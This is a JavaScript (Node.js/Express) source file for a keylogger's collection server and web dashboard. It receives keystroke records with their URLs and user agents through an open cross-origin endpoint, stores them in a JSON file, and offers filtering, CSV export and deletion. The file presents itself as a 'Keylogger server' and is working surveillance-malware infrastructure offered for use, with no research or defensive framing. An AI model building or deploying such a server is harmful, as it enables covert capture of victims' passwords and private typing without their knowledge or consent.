const express = require("express");
const cors = require("cors");
const app = express();
const port = 3000;
const fs = require('fs');
const LOG_FILE = 'logs.json';

let logs = [];

// Load logs from file if exists
try {
  if (fs.existsSync(LOG_FILE)) {
    logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
  }
} catch (e) { logs = []; }

function saveLogsToFile() {
  fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
}

app.use(cors());
app.use(express.json());

app.post("/log", (req, res) => {
  logs.push(req.body);
  saveLogsToFile();
  res.sendStatus(200);
});

app.get("/logs", (req, res) => {
  // Filtering
  let filtered = logs;
  const { url, key, type, userAgent, timestamp } = req.query;
  if (url) filtered = filtered.filter(l => l.url && l.url.includes(url));
  if (key) filtered = filtered.filter(l => l.key && l.key.includes(key));
  if (type) filtered = filtered.filter(l => l.type === type);
  if (userAgent) filtered = filtered.filter(l => l.userAgent && l.userAgent.includes(userAgent));
  if (timestamp) filtered = filtered.filter(l => l.timestamp && l.timestamp.includes(timestamp));
  res.json(filtered);
});

app.delete("/logs", (req, res) => {
  logs = [];
  saveLogsToFile();
  res.sendStatus(200);
});

app.get("/export", (req, res) => {
  const csv = [
    'Time,URL,Key,Type,User-Agent',
    ...logs.map(l =>
      [l.timestamp, l.url, l.key, l.type, l.userAgent].map(x => '"' + (x || '').replace(/"/g, '""') + '"').join(',')
    )
  ].join('\n');
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="keylogs.csv"');
  res.send(csv);
});

app.get("/", (req, res) => {
  res.send(`<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Keylogger Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f7f7f7; padding: 0; margin: 0; }
    .container { max-width: 1100px; margin: 30px auto; background: #fff; border-radius: 10px; box-shadow: 0 2px 12px #0001; padding: 32px 24px; }
    h1 { color: #f2aa4c; margin-bottom: 18px; }
    .controls {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
      margin-bottom: 18px;
      align-items: flex-end;
    }
    .controls input {
      padding: 7px 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 15px;
      background: #fafafa;
      transition: border 0.2s;
      height: 38px;
      box-sizing: border-box;
    }
    .controls input:focus { border: 1.5px solid #f2aa4c; outline: none; }
    .controls button {
      background: #f2aa4c;
      color: #fff;
      border: none;
      border-radius: 5px;
      padding: 8px 18px;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      box-shadow: 0 1px 4px #0001;
      transition: background 0.2s, box-shadow 0.2s;
      margin-right: 4px;
      height: 38px;
      box-sizing: border-box;
      display: flex;
      align-items: center;
    }
    .controls button:hover { background: #d18d2c; box-shadow: 0 2px 8px #0002; }
    table {
      border-collapse: collapse;
      width: 100%;
      background: #fff;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 1px 6px #0001;
      margin-bottom: 10px;
    }
    thead th {
      position: sticky;
      top: 0;
      background: #f2aa4c;
      color: #fff;
      font-weight: 600;
      z-index: 2;
      letter-spacing: 0.5px;
    }
    th, td {
      border: none;
      padding: 10px 8px;
      text-align: left;
      font-size: 15px;
    }
    tbody tr:nth-child(even) { background: #f9f6f2; }
    tbody tr:hover { background: #ffe5b7; transition: background 0.2s; }
    @media (max-width: 900px) {
      .container { padding: 10px 2vw; }
      table, thead, tbody, th, td, tr { font-size: 13px; }
      .controls { flex-direction: column; align-items: stretch; }
    }
    @media (max-width: 600px) {
      .container { padding: 2vw 1vw; }
      h1 { font-size: 1.2em; }
      table, thead, tbody, th, td, tr { font-size: 11px; }
      .controls input, .controls button { font-size: 12px; padding: 6px 8px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>📝 Keystroke Dashboard</h1>
    <div class="controls">
      <button onclick="loadLogs()">Refresh</button>
      <button onclick="exportCSV()">Export CSV</button>
      <button onclick="deleteLogs()" style="background:#e74c3c;">Delete All Logs</button>
      <input id="searchUrl" placeholder="Filter URL">
      <input id="searchKey" placeholder="Filter Key">
      <input id="searchType" placeholder="Filter Type">
      <input id="searchUA" placeholder="Filter User-Agent">
      <input id="searchTime" placeholder="Filter Time">
    </div>
    <table>
      <thead>
        <tr><th>#</th><th>Time</th><th>URL</th><th>Key</th><th>Type</th><th>User-Agent</th></tr>
      </thead>
      <tbody id="logBody">
        <tr><td colspan="6">Loading…</td></tr>
      </tbody>
    </table>
  </div>
  <script>
    let autoRefresh = true;
    function loadLogs() {
      const params = new URLSearchParams();
      if (searchUrl.value) params.append('url', searchUrl.value);
      if (searchKey.value) params.append('key', searchKey.value);
      if (searchType.value) params.append('type', searchType.value);
      if (searchUA.value) params.append('userAgent', searchUA.value);
      if (searchTime.value) params.append('timestamp', searchTime.value);
      fetch('/logs?' + params.toString())
        .then(res => res.json())
        .then(data => {
          const rows = data.map((l,i) =>
            '<tr>' +
              '<td>' + (i+1) + '</td>' +
              '<td>' + (l.timestamp || '-') + '</td>' +
              '<td>' + (l.url || '-') + '</td>' +
              '<td>' + (l.key || '-') + '</td>' +
              '<td>' + (l.type || '-') + '</td>' +
              '<td>' + (l.userAgent || '-') + '</td>' +
            '</tr>'
          ).join('') || '<tr><td colspan="6">No logs yet.</td></tr>';
          document.getElementById('logBody').innerHTML = rows;
        });
    }
    function exportCSV() {
      window.location = '/export';
    }
    function deleteLogs() {
      if (confirm('Are you sure you want to delete all logs?')) {
        fetch('/logs', { method: 'DELETE' })
          .then(() => loadLogs());
      }
    }
    // Auto-refresh every 3 seconds
    setInterval(() => { if (autoRefresh) loadLogs(); }, 3000);
    // Disable auto-refresh when user types in filter
    document.querySelectorAll('.controls input').forEach(inp => {
      inp.addEventListener('input', () => { autoRefresh = false; });
    });
    loadLogs();
  </script>
</body>
</html>`);
});

app.listen(port, () => {
  console.log(`Keylogger server running at http://localhost:${port}`);
});